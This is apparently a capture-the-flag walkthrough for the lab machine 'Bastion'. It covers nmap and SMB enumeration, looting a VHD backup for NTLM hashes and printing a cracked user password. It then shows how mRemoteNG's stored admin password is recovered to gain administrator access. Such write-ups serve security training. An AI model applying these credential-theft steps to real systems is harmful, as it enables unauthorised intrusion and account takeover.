@@ -1,0 +1,168 @@
+Bastion 10.10.10.134
+
+Rank Medium
+
+This one is based on MRemoteNG which is a tool to remote access devices
+as you can see below in the demostration some local tools during pen tests
+can lead you to the keys to the kingdom.
+
+
+To start we fire up nmap and take a look at what is going on the box
+
+Nmap scan report for 10.10.10.134
+Host is up (0.30s latency).
+Not shown: 996 closed ports
+PORT    STATE SERVICE      VERSION
+22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
+|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
+|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -39m34s, deviation: 1h09m15s, median: 23s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Bastion
+|   NetBIOS computer name: BASTION\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2019-07-09T17:12:05+02:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-07-09 15:12:08
+|_  start_date: 2019-07-09 13:42:33
+
+
+As we can see smb is wide open so we check what is going on by using
+smbclient on either Kali or any pen testing distro. By using the 
+smbclient -L //10.10.10.134/ we test whether open access to the share
+is enabled from the DC. 
+------------------------------------------------------------------------------------------------
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	Backups         Disk      
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+-------------------------------------------------------------------------------------------------
+We can see now that smbv2 is enabled and the attack vector of using a payload
+may not work on this one. Using any user any password was able to sneak into
+Backups and take a look around.
+
+-------------------------------------------------------------------------------------------------
+ .                                   D        0  Tue Jul  9 14:50:48 2019
+  ..                                  D        0  Tue Jul  9 14:50:48 2019
+  nmap-test-file                      A      260  Tue Jul  9 14:50:49 2019
+  note.txt                           AR      116  Tue Apr 16 10:10:09 2019
+  SDT65CB.tmp                         A        0  Fri Feb 22 11:43:08 2019
+  WindowsImageBackup                  D        0  Fri Feb 22 11:44:02 2019
+-------------------------------------------------------------------------------------------------
+
+Right away I see something juicy and went for it in the WindowsImageBackup
+folder and found 2 files called backup.vhd lets see whats in here. 
+
+9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd      A 37761024  Fri Feb 22 11:44:03 2019
+9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd      A 5418299392  Fri Feb 22 11:45:32 2019
+
+Hmm wander if any creds are in there lol so we dive into the vhd files I used the get command
+ex. get "9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd" make sure use qoutes it will say it does not
+exsist as it cannot handle spaces as you dig thru the directories. 
+
+I then put the vhd file on my windows box so I can mount the vhd and digging around
+found these creds in a hidden in a xml file dig around you will find.
+
+----------------------------------------------------------------------------------------------------------
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9::: - cracked (bureaulampje)
+----------------------------------------------------------------------------------------------------------
+
+After firing up john or johnny/hashcat either one will suffice I was able to crack the
+hash as you can see below we now have a user to log on to the system and see if we can find
+the user flag now. I also find that using online crackers can help you speed up the process
+especially in CTF's were you maybe looking for first bloods or whatever.
+
+first user
+username - L4mpje
+password - bureaulampje
+
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9::: - cracked (bureaulampje)
+
+Seeing as the box has ssh enabled lets login and take a look and see if we can go that way first
+As we can see in the pic there is the door we now have user flag and moving along to further prob
+the box.
+
+[pic here] will be added to blog
+
+Now we have our user flag!
+
+Looking around I find something very out of place seeing as RDP is not enabled and other
+remote options were disabled they have a version of mRemoteNG and briefly looking it up
+I found an exploit for it how it stores the admin password in the confCons.xml file and there
+are exploits written for an older versions but this was a more lets say 1337 way of doing it.
+
+Newly written python script can be found on Page 14 of the Bastion forum. The method I used
+followed this article here - http://hackersvanguard.com/mremoteng-insecure-password-storage/
+
+Directory of C:\Program Files (x86)                                                                            
+
+22-02-2019  15:01    <DIR>          .                                                                           
+22-02-2019  15:01    <DIR>          ..                                                                          
+16-07-2016  15:23    <DIR>          Common Files                                                                
+23-02-2019  10:38    <DIR>          Internet Explorer                                                           
+16-07-2016  15:23    <DIR>          Microsoft.NET                                                               
+22-02-2019  15:01    <DIR>          mRemoteNG                                                                   
+23-02-2019  11:22    <DIR>          Windows Defender                                                            
+23-02-2019  10:38    <DIR>          Windows Mail                                                                
+23-02-2019  11:22    <DIR>          Windows Media Player                                                        
+16-07-2016  15:23    <DIR>          Windows Multimedia Platform                                                 
+16-07-2016  15:23    <DIR>          Windows NT                                                                  
+23-02-2019  11:22    <DIR>          Windows Photo Viewer                                                        
+16-07-2016  15:23    <DIR>          Windows Portable Devices                                                    
+16-07-2016  15:23    <DIR>          WindowsPowerShell                                                           
+               0 File(s)              0 bytes                                                                   
+              14 Dir(s)  11.274.854.400 bytes free
+
+
+After extracting the config file thru scp or smb either or I was able to copy the contents 
+of the config file to the one I installed on my box. All you have to do is download a copy of 
+mRemoteNG yourself to reproduce the exploit. After setting up and running the command /k echo %password% 
+from the DC you can we have music.
+
+[pic here of exploit] https://postimg.cc/5YZ6XW2R
+
+Logging back ssh again we now own the keys to the kingdom and have the root flag
+
+administrator@BASTION C:\Users\Administrator\Desktop>dir                                                        
+ Volume in drive C has no label.                                                                                
+ Volume Serial Number is 0CB3-C487                                                                              
+
+ Directory of C:\Users\Administrator\Desktop                                                                    
+
+23-02-2019  10:40    <DIR>          .                                                                           
+23-02-2019  10:40    <DIR>          ..                                                                          
+23-02-2019  10:07                32 root.txt      ROOT!!!!!!! WOOT WOOT reee reeee                                                              
+               1 File(s)             32 bytes                                                                   
+               2 Dir(s)  11.274.567.680 bytes free
+
+As you can see we now have our flag and completed Bastion...
+
+Hacktheplanet!! and be well
+
+C-3P0
+------------------------------------------------------------------------------------------------------------------------------
